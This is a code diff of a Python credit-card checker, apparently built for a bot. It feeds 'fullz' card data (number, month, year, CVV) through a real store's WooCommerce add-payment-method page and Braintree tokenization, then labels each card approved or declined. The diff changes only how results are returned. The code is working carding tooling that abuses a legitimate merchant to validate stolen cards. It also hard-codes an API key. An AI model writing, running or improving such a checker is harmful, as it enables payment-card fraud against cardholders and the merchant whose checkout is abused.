@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import base64
 import random
 import time
@@ -11,6 +12,9 @@ logging.basicConfig(
     level=logging.INFO
 )
 logger = logging.getLogger(__name__)
+
+# Your API key
+API_KEY = "waslost"
 
 def gets(s, start, end):
     try:
@@ -33,7 +37,11 @@ def charge_resp(result):
     except Exception as e:
         return f"Error 🚫 - {str(e)}"
 
-def create_payment_method(fullz):
+def process_card_b3(fullz):
+    """
+    Process a single card through Braintree Auth
+    Returns: dict with gateway, status, response
+    """
     try:
         cc, mes, ano, cvv = fullz.split("|")
 
@@ -75,7 +83,11 @@ def create_payment_method(fullz):
         if 'name="woocommerce-login-nonce"' in response.text:
             login = gets(response.text, 'name="woocommerce-login-nonce" value="', '"')
         else:
-            return "Nonce[1] Not Found"
+            return {
+                "gateway": "Braintree Auth",
+                "status": "Error",
+                "response": "Nonce[1] Not Found"
+            }
 
         headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
@@ -134,7 +146,11 @@ def create_payment_method(fullz):
             pnonce = gets(response.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
             clientToken = gets(response.text, '"client_token_nonce":"', '"')
         else:
-            return "Nonce[2] Not Found"
+            return {
+                "gateway": "Braintree Auth",
+                "status": "Error",
+                "response": "Nonce[2] Not Found"
+            }
 
         headers = {
             'accept': '*/*',
@@ -166,14 +182,22 @@ def create_payment_method(fullz):
         if 'data' in response.json():
             dataToken = response.json()['data']
         else:
-            return "Nonce[3] Not Found"
+            return {
+                "gateway": "Braintree Auth",
+                "status": "Error",
+                "response": "Nonce[3] Not Found"
+            }
 
         dec = base64.b64decode(dataToken).decode('utf-8')
 
         if 'authorizationFingerprint"' in dec:
             at = gets(dec, 'authorizationFingerprint":"', '"')
         else:
-            return "Nonce[4] Not Found"
+            return {
+                "gateway": "Braintree Auth",
+                "status": "Error",
+                "response": "Nonce[4] Not Found"
+            }
 
         headers = {
             'accept': '*/*',
@@ -224,7 +248,11 @@ def create_payment_method(fullz):
         if 'token' in response.text:
             token = response.json()['data']['tokenizeCreditCard']['token']
         else:
-            return "Nonce[5] Not Found"
+            return {
+                "gateway": "Braintree Auth",
+                "status": "Error",
+                "response": "Nonce[5] Not Found"
+            }
 
         headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
@@ -263,66 +291,38 @@ def create_payment_method(fullz):
         response = ses.post('https://iditarod.com/my-account/add-payment-method/', cookies=ses.cookies, headers=headers, data=data)
 
         if "Payment method successfully added" in response.text or "payment method added" in response.text.lower():
-            return response.text
-
-        resp = gets(response.text, '<ul class="woocommerce-error" role="alert">', '</ul>')
-
-        pattern = r"Status code\s*(.*)</li>"
-        match = re.search(pattern, resp)
-
-        if match:
-            resp = match.group(1).strip() 
-        return resp
-
-    except Exception as e:
-        logger.error(f"Error in create_payment_method: {str(e)}")
-        return str(e)
-
-def process_card_b3(cc):
-    """
-    Process credit card through Braintree Auth gateway
-    Returns: dict with status, response, and gateway
-    """
-    try:
-        # Parse the card details
-        parts = cc.split("|")
-        if len(parts) < 4:
-            return {
-                "status": "ERROR",
-                "response": "Invalid format. Use: CC|MM|YY|CVV",
-                "gateway": "Braintree Auth"
-            }
-        
-        # Use the existing create_payment_method function
-        result = create_payment_method(cc)
-        response = charge_resp(result)
-        
-        # Convert the response to match your bot's format
-        if "Approved ✅" in response:
-            return {
-                "status": "APPROVED",
-                "response": "Payment Approved",
-                "gateway": "Braintree Auth"
-            }
-        elif "Declined ❌" in response:
-            # Extract the decline reason
-            decline_reason = response.replace("Declined ❌ - ", "").strip()
-            return {
-                "status": "DECLINED",
-                "response": decline_reason[:120],  # Limit response length
-                "gateway": "Braintree Auth"
-            }
+            result_text = response.text
         else:
-            return {
-                "status": "ERROR",
-                "response": response,
-                "gateway": "Braintree Auth"
-            }
+            resp = gets(response.text, '<ul class="woocommerce-error" role="alert">', '</ul>')
+            pattern = r"Status code\s*(.*)</li>"
+            match = re.search(pattern, resp)
+            if match:
+                result_text = match.group(1).strip()
+            else:
+                result_text = resp
 
-    except Exception as e:
+        # Process the result and return appropriate status
+        response_text = charge_resp(result_text)
+        
+        if "Approved" in response_text:
+            status = "Approved"
+        elif "Declined" in response_text:
+            status = "Declined"
+        else:
+            status = "Error"
+
         return {
-            "status": "ERROR",
-            "response": f"Processing Error: {str(e)}",
-            "gateway": "Braintree Auth"
+            "gateway": "Braintree Auth",
+            "status": status,
+            "response": response_text
         }
 
+    except Exception as e:
+        logger.error(f"Error in process_card_b3: {str(e)}")
+        return {
+            "gateway": "Braintree Auth",
+            "status": "Error",
+            "response": f"Error 🚫 - {str(e)}"
+        }
+
+# Flask app removed since it's not needed for the bot integration
